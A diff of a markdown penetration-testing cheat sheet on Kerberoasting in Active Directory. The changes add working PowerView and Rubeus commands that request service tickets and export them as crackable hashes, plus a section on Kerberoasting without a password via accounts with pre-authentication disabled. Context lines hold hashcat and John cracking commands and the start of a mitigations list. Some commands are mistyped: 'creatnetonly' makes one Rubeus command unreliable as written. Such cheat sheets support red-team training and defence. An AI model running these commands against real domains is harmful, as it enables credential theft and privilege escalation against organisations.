@@ -41,16 +41,40 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   ```
 ## Windows
 
-### Manual Method
+### Enumeration
 * **Using setspn.exe to enumerate SPN's**   
   ```powershell
   setspn.exe -Q */*
   ```
-* **Targeting a single user**  
+* **Powerview**  
+    ```powershell
+    Get-DomainUser -SPN
+    ```
+### Attack
+* **Powershell**  
   ```powershell
   Add-Type -AssemblyName System.IdentityModel
   New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <SPN Name>
   ```
+* **Powerview**  
+    ```powershell
+    Invoke-Kerberoast
+    ```
+    ```powershell
+    #Get all SPN's
+    Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
+    cat tgs.csv
+
+    #Get Single User SPN
+    Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
+    
+    #Get Kerberoast Hash of a single user
+    Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" -Format Hashcat
+    ```
+* **Rubeus
+    ```powershell
+    Rubeus.exe kerberoast /nowrap
+    ```
 * **Retrieving All Tickets Using setspn.exe**  
   Caution: This will pull all computer accounts as well, so use with caution
   ```powershell
@@ -84,8 +108,6 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   ```bash
   hashcat -a 0 -m 13100 <hashfile> <wordlist>
   ```
-
-### Automated Methods
 
 * **netexec Module**  
 
@@ -124,20 +146,6 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
 
 * **[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)**  
 
-  ```powershell
-  # ?
-  Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
-  
-  #List all SPN's
-  Get-Domainuser * -spn | select samaccountname
-
-  #Target a specific user
-  Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
-
-  #Export all tickets to a .csv
-  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
-  ```
-
 ### Mac(osX)
 * **[bifrost](https://github.com/its-a-feature/bifrost) on macOS machine**  
 
@@ -158,7 +166,21 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
 ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
 ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
 ```
+### Kerberoasting w/o an Account Password
+* **Requirements**  
+  1. Username of an account wiht pre-auth disabled (DONT_REQ_PREAUTH)
+  2. Target SPN or list of SPN's
 
+* **The Attack**  
+  1. Execute Rubeus in creatnetonly
+     ```powershell
+     Rubeus.exe creatnetonly /program:cmd.exe /show
+     ```
+  2. Perform the attack with /nopreauth
+     ```powershell
+     Rubeus.exe kerberoast /nopreauth:<username> /domain:<domain> /spn:<SPN> /nowrap
+     # Instead of /spn, we can use /spns:listofspns.txt and try multiple SPN's
+     ```
 **Mitigations**:
 
 * Have a very long password for your accounts with SPNs (> 32 characters)
